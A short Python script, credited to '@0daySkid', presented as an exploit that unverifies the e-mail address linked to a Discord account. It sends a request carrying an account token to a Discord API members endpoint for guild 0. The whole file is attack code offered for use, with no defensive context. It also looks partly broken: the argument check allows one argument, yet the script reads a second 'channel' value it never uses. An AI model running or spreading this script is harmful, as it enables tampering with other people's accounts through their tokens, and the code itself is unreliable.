# Name: Unverify E-mail
# Description: Unverify e-mail address that is linked to account
# Author: checksum (@0daySkid)
# Original founder: fweak

import requests
import sys

class Exploit:

    def __init__(self, token, channel):
        self.token = token
        self.channel_id = channel
        self.headers = {'Authorization': token}


    def execute(self):
        """ unverify e-mail """
        return requests.get('https://discord.com/api/v6/guilds/0/members', headers=self.headers)


def main():
    if len(sys.argv) < 2:
        print(f'Usage: py {sys.argv[0]} <token>')
        sys.exit()

    token = sys.argv[1]
    channel_id = sys.argv[2]

    exploit = Exploit(token, channel_id)

    exploit.execute()


if __name__ == '__main__':
    main()
